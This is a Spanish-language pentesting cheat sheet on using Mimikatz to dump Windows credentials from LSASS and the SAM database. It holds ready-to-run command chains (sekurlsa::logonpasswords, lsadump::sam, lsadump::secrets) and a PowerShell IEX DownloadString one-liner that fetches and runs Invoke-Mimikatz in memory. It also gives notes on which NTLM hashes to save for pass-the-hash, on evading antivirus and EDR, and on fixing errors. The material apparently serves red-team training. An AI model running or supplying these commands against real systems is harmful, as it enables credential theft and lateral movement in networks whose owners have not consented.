# Mimikatz 

Tags: #Mimikatz #Windows  #LSASS

Mimikatz es una herramienta de seguridad de código abierto desarrollada por Benjamin Delpy (gentilkiwi), ampliamente reconocida en la comunidad de ciberseguridad. Es comúnmente empleada en actividades de Red Teams y evaluaciones de seguridad en sistemas Windows. Su objetivo principal es analizar y aprovechar diversas vulnerabilidades de seguridad en este sistema operativo, siendo especialmente conocida por su capacidad para recuperar contraseñas en texto plano, hashes NTLM y tickets Kerberos directamente desde la memoria. Además, permite realizar técnicas como pass-the-hash, pass-the-ticket y generar tickets Kerberos dorados o plateados, lo que resulta invaluable para movimientos laterales dentro de entornos Active Directory (AD).

Dentro de la sesión de Meterpreter usaremos la extensión de Kiwi para dumpear passwords. Pero debemos de ser 'NT Authority\\System'

# LSASS

El servicio Local Security Authority Subsystem Service (LSASS) en sistemas operativos Windows es crucial para la administración de la política de seguridad y maneja la autenticación de usuarios en el sistema local. Para un pentester, el entendimiento profundo de LSASS y cómo interactúa con los componentes de seguridad de Windows es fundamental para la evaluación de la postura de seguridad de un sistema y la ejecución de ciertas formas de ataques. Aquí hay varios aspectos de LSASS que son de especial interés:

```bash 
# Función y Rol de LSASS

- Autenticación: LSASS es responsable de la autenticación de usuarios para las sesiones de inicio de sesión en una computadora.
- Creación de Tokens: Cuando se autentica a un usuario, LSASS genera un "token de acceso" que contiene los derechos y privilegios del usuario.
- Almacenamiento de Credenciales: En el proceso de LSASS, las credenciales, como hashes de contraseñas y tickets Kerberos, son almacenados en la memoria.
    

# Ataques y Tácticas Asociadas con LSASS
- Dumping de Credenciales: Las herramientas de extracción de credenciales como Mimikatz explotan el acceso a LSASS para obtener hashes de contraseñas y tickets de autenticación.
- Pass-the-Hash / Pass-the-Ticket: Las credenciales extraídas pueden ser usadas para realizar estos ataques, permitiendo a los atacantes autenticarse como otro usuario sin conocer la contraseña en texto claro.
- Inyección de Código: Los atacantes pueden intentar inyectar código malicioso en el proceso LSASS para interceptar credenciales o elevar privilegios.
    

Técnicas de Protección y Evasión
- Protección de Memoria: Los pentesters deben estar al tanto de las características como Credential Guard que protegen la memoria de LSASS.
- Detección de Anomalías: La manipulación de LSASS puede disparar alertas en soluciones de detección de intrusiones y en los sistemas de protección contra malware.
- Técnicas de Evasión: Para evitar la detección, los pentesters pueden necesitar usar técnicas de evasión o desarrollar nuevas herramientas que no estén firmadas por firmas de AV.
```

## Hash NTLM

```bash 
El hash NTLM (NT LAN Manager) es una función hash utilizada por Microsoft para almacenar contraseñas de usuario. Es un método de cifrado que ha sido utilizado en varios protocolos de autenticación de Microsoft a lo largo de los años, incluidos los protocolos de autenticación de red como NTLMv1 y NTLMv2.

Características y detalles sobre el hash NTLM:

1. Forma de Creación: El hash NTLM se crea tomando la contraseña del usuario, convirtiéndola a Unicode y luego aplicando una función hash MD4.
    
2. No tiene SALT: A diferencia de otros métodos de almacenamiento de contraseñas, el hash NTLM no utiliza un "salto" (valor aleatorio agregado para hacer que el hashing sea más seguro). Esto lo hace vulnerable a ataques de fuerza bruta y a ataques de tabla arco iris, donde los atacantes usan tablas precomputadas para buscar rápidamente el valor original de un hash.
    
3. Uso en Protocolos: Aunque NTLM ha sido reemplazado en gran medida por métodos más seguros como Kerberos en entornos modernos de Active Directory, todavía se encuentra en muchas redes debido a la retrocompatibilidad o configuraciones heredadas.
    
4. Vulnerabilidades: Debido a sus debilidades inherentes y la falta de características de seguridad modernas, NTLM es susceptible a una variedad de ataques, como el mencionado ataque de tabla arco iris, ataques de relevo NTLM, y otros.
    
5. Recomendación: Debido a las debilidades conocidas asociadas con NTLM, se recomienda deshabilitar su uso siempre que sea posible, en favor de protocolos de autenticación más seguros como Kerberos.
```

## Funciones 

```bash 
1. 'privilege::debug': Este comando en Mimikatz solicita privilegios de depuración para el proceso Mimikatz. Los privilegios de depuración son necesarios para acceder a ciertas áreas de la memoria del sistema operativo y realizar operaciones que normalmente están restringidas.
    
2. 'token::elevate': Este comando intenta elevar los privilegios de Mimikatz. En el contexto de Mimikatz, esto generalmente significa obtener un token de seguridad de un proceso con privilegios más altos, permitiendo que Mimikatz opere con esos privilegios elevados.
    
3. 'sekurlsa::logonpasswords': Este comando extrae las contraseñas y otros datos de autenticación de la memoria del sistema, específicamente desde la seguridad de Kerberos, SSP, msv1_0, entre otros. Utiliza el módulo sekurlsa de Mimikatz para acceder a la información almacenada por el proceso LSASS (Local Security Authority Subsystem Service).

    
4. 'lsadump::sam': Este comando extrae las credenciales almacenadas en la base de datos SAM (Security Accounts Manager). La SAM contiene las credenciales de todos los usuarios locales del sistema y se utiliza generalmente para obtener hashes de contraseñas de cuentas locales.

    
5. 'lsadump::secrets': Este comando se utiliza para extraer "secretos" almacenados por el sistema, como claves de acceso y otros datos sensibles, que pueden estar almacenados en el registro o en el servicio LSASS.
```

## Extracción de credenciales con binario .exe

```bash 
Pros
- Funcionalidad Completa: La versión ejecutable suele tener todas las funciones de Mimikatz disponibles y está actualizada con las últimas características. 
- Rapidez: Al ejecutar el binario directamente, se suele tener una ejecución más rápida y directa de las funciones deseadas.
    

Contras
- Detección: Es más probable que los antivirus y las herramientas de seguridad modernas detecten la versión ejecutable debido a sus firmas conocidas. 
- Necesidad de Escritura en el Disco: A menos que se cargue en la memoria de manera especial, es probable que requiera ser escrito en el disco para su ejecución, lo que aumenta el riesgo de detección y deja evidencia forense. 
- Bloqueo por Políticas de Seguridad: Políticas de grupo y configuraciones de seguridad de Windows pueden impedir la ejecución de binarios desconocidos o no firmados.
```

* [Mimikatz](https://gitlab.com/kalilinux/packages/mimikatz/-/tree/kali/master/x64?ref_type=heads)

```bash 
❯ net user                            # Miramos todos los usuarios existentes y sus grupos
❯ net user /domain                    # Identificar los usuarios del dominio
```

```powershell
# Ejecutar Mimikatz como 'Administrador'
❯ .\mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::logonpasswords' 'lsadump::sam' 'lsadump::secrets' exit


Nota1:
	1. sekurlsa::logonpasswords = Muestra info de cada usuario 'Name, Hash NTLM, SHA1, Domain'. El 'SID' es un identificador unico del objeto en el DC
	2. Existen usuarios por defecto 'DWM-8, DWM-10, UMDF-8, UMDF-10, etc...' ya que tienen como dominio 'Window Manager, Font Driver Host'
	3. Mirar si la 'session' = 'Service from 0', si es asi guardar toda la salida del usuario ya que se puede utilizar
	4. Si al final del 'username' hay un '$' quiere decir que es un objeto de tipo computador
	5. Valores importantes a guardar 'SID, Username, Domain, NTLM, SHA1'


Nota2:
	1. lsadump::sam = Muestra las credenciales en la DB SAM
	2. Guardar los hashes 'NTLM' del usuario 'Administrator' local 
```

```powershell
❯ Invoke-mimikatz -DumpCreds          # Dumpear las credenciales locales, obtener el NTLM y hacer un PtH
❯ Invoke-mimikatz -DumpCreds -ComputerName @("comp1","comp2")
```

## Extracción de credenciales con Powershell 

```bash 
Pros
- Evasión: La versión de PowerShell puede ser más sigilosa, evadiendo mejor la detección de antivirus y soluciones EDR que buscan hashes de archivos conocidos.
- Flexibilidad: Puede ser más fácil de ejecutar en memoria sin necesidad de escribir en el disco, lo cual es menos intrusivo y reduce la huella en el sistema de la víctima.
- Integración: Se integra bien con otras herramientas y scripts de PowerShell, facilitando su uso en cadenas de ataque complejas.
    

Contras
- Funcionalidad Limitada: Puede no tener todas las funciones que la versión completa .exe ofrece.
- Logging de PowerShell: Las versiones más recientes de Windows tienen mejoras en el registro de actividades de PowerShell, lo que podría dejar rastros para los equipos de respuesta a incidentes.
- Bloqueo de Scripts: Las políticas de ejecución de scripts y restricciones de firmas digitales pueden bloquear la ejecución de scripts PowerShell no firmados.
```

```powershell 
# Descargamos el binario del repositorio
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1');

# Utilizamos la funcion para ejecutar Mimikatz
❯ Invoke-Mimikatz -Command '"token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets"'
```

## Errores en Mimikatz 

```bash 
1. 'ERROR kuhl_m_sekurlsa_acquireLSA ; Key import'
Para solucionar el error utilizar una version antigua de mimikatz:

    https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099/x64

2. 'ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege'
Para solucionar el error se debe correr como administrador el proceso desde donde se ejecutara el binario.
```